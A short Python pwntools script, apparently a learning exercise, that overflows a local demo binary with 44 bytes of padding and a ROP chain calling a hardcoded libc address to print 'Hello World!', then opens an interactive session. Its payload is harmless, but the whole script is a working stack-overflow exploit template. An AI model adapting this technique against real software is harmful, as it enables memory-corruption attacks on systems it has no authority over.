#! /usr/bin/env python3

from pwn import *

offset = 44

exe = ELF("./demo.exe")
context.update(arch='i386', os="linux")
p = exe.process()

rop = ROP(exe)
rop.call(p32(0xf7e15f80), ["Hello World!"])
print(rop.chain())

payload = [
    b"A"*offset,
    rop.chain()
]

payload = b"".join(payload)

p.sendline(payload)

p.interactive()